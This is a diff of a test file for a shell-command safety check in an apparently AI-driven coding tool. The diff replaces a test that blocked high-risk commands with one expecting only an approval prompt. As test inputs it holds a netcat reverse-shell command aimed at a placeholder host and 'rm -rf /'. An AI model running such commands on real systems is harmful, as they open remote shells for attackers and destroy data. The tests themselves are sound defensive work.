@@ -1,6 +1,6 @@
 import type { ToolExecution } from '@deepseek-ai/dsh-tools'
 import { describe, expect, it } from 'vitest'
-import { checkCommand, heldCommands, shellCommandOf } from '../src/command.ts'
+import { checkCommand, shellCommandOf } from '../src/command.ts'
 import type { CommandParams, CommandResult } from '../src/protocol.ts'
 import type { Gate } from '../src/response.ts'
 
@@ -21,12 +21,10 @@ describe('DeepSeek pre-execution shell command check', () => {
     expect(calls).toEqual([{ session: 'session-capability-0000000000000731', tool: 'bash', call_id: 'call-731', command: 'git status' }])
   })
 
-  it('denies high risk with a hint and keeps its error out of the result gate', async () => {
-    const run = exec('bash', { command: 'nc -e /bin/sh x 4444' })
-    const decision = await checkCommand(run, gate({ status: 'dangerous', category: 'shell_command', risk: 'high', decision_score: 10 }), on)
-    expect(decision).toMatchObject({ kind: 'deny' })
-    expect((decision as { reason: string }).reason).toMatch(/blocked this shell command before it ran \(high shell-command risk, score 10\.0\)/)
-    expect(heldCommands.has(run)).toBe(true)
+  it('asks even for a high score: Patronus never blocks a command on its own', async () => {
+    const decision = await checkCommand(exec('bash', { command: 'nc -e /bin/sh x 4444' }), gate({ status: 'dangerous', category: 'shell_command', risk: 'medium', decision_score: 10 }), on)
+    expect(decision).toMatchObject({ kind: 'ask' })
+    expect((decision as { reason: string }).reason).toMatch(/shell-command risk, score 10\.0/)
   })
 
   it('asks the user for medium risk through the approval service', async () => {
@@ -36,7 +34,7 @@ describe('DeepSeek pre-execution shell command check', () => {
 
   it('lets the command run when the check is off, unavailable or failing', async () => {
     const command = exec('bash', { command: 'rm -rf /' })
-    expect(await checkCommand(command, gate({ status: 'dangerous', category: 'shell_command', risk: 'high' }), () => false)).toBeUndefined()
+    expect(await checkCommand(command, gate({ status: 'dangerous', category: 'shell_command', risk: 'medium' }), () => false)).toBeUndefined()
     expect(await checkCommand(command, gate({ status: 'unavailable', category: 'shell_command', reason: 'shell_model_missing' }), on)).toBeUndefined()
     expect(await checkCommand(command, gate(Error('runtime down')), on)).toBeUndefined()
   })
